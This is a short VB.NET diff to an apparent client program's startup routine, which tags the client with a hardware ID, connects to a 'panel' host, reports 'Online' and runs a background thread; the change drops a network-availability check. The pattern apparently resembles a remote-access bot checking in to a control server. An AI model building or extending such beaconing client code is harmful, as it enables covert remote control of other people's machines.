@@ -1,4 +1,4 @@
-﻿Imports System.Threading
+Imports System.Threading
 Imports System.Net
 Imports System.Text
 Imports System.IO
@@ -96,19 +96,16 @@ Public Class MainController
                     C.Host = Host
                 End If
             End If
+            
             C.ID = ID & "_" & HWD()
             C.Data = ClientData()
-
-            If My.Computer.Network.IsAvailable = True Then
-                If C.IsPanel(C.Host) Then
-                    C.Connect()
-
-                    C.Send("Online")
-
-                    C.Log("Succ", "Client is Connected")
-                End If
+            
+            If C.IsPanel(C.Host) Then
+                C.Connect()
+                C.Send("Online")
+                C.Log("Succ", "Client is Connected")
             End If
-
+            
             Dim t As New Thread(AddressOf IND)
             t.IsBackground = True
             t.Start(True)
